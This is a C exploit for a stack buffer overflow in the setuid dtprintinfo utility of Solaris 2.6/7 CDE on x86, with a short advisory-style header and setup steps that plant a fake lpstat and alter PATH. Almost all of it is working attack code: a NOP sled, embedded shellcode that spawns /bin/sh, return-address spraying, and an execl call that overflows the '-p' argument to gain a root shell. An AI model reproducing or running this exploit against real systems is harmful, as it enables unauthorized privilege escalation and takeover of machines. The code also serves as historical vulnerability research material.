/*
source: http://www.securityfocus.com/bid/249/info

The dtprintinfo is a setuid commands open the CDE Print Manager window. A stack based buffer overflow in the handling of the "-p" option allow the execution of arbitrary code as root.

This vulnerablity has been assigned Sun Bug# 4139394. The vulnerability is in the CDE 1.2 and CDE 1.3 subsystem of Solaris 2.6 and Solaris 7 respectibly. 

Before executing the ex_dtprintinfo exploit set your DISPLAY environment variable correctly, and make a dummy lpstat command like:

% cat > lpstat
echo "system for lpprn: server.com"
^D
% chmod 755 lpstat
% setenv PATH .:$PATH
% gcc ex_dtprintinfo.c
% a.out 
*/

/*========================================================================
   ex_dtprintinfo.c Overflow Exploits( for Intel x86 Edition)
   The Shadow Penguin Security (http://base.oc.to:/skyscraper/byte/551)
   Written by UNYUN (unewn4th@usa.net)
  ========================================================================
*/
static char             x[1000];
#define ADJUST          0
#define STARTADR        621
#define BUFSIZE         900
#define NOP             0x90
unsigned long ret_adr;
int     i;
char exploit_code[] =
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x8d\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33"
"\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88"
"\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f"
"\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46"
"\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01"
"\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/sh";

unsigned long get_sp(void)
{
  __asm__(" movl %esp,%eax ");
}
main()
{
        putenv("LANG=");
        for (i=0;i<BUFSIZE;i++) x[i]=NOP;
        for (i=0;i<strlen(exploit_code);i++)
                x[STARTADR+i]=exploit_code[i];
        ret_adr=get_sp() - 1292 + 148;
        for (i = ADJUST; i < 400 ; i+=4){
                x[i+0]=ret_adr & 0xff;
                x[i+1]=(ret_adr >> 8 ) &0xff;
                x[i+2]=(ret_adr >> 16 ) &0xff;
                x[i+3]=(ret_adr >> 24 ) &0xff;
        }
        x[BUFSIZE]=0;
        execl("/usr/dt/bin/dtprintinfo", "dtprintinfo",
        "-p",x,(char *) 0);
}